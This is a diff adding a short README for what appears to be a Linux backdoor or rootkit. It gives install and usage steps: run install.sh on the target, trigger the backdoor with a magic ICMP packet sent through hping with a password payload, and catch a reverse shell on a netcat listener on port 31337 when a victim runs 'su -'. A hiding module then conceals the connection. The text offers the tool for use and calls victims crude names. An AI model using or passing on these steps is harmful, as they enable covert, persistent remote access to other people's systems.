@@ -1,0 +1,18 @@
+install
+-------
+
+- just run ./install.sh
+
+
+usage
+-----
+
+- send magic icmp packet: hping 192.168.2.56 -c 1 -1 -C 8 -e "opensesame" -d 133
+- open "nc -lvvp 31337" on your machine
+- wait for "su -" call by any bitches on the owned box and you will get reverse
+  connect. after that you want to hide your connection, so you should call
+  "su -", too, to make a syscall to our conn_hiding() module. yeah i know,
+  dirty, but it runs. ;)
+
+gr33ts,
+noptrix
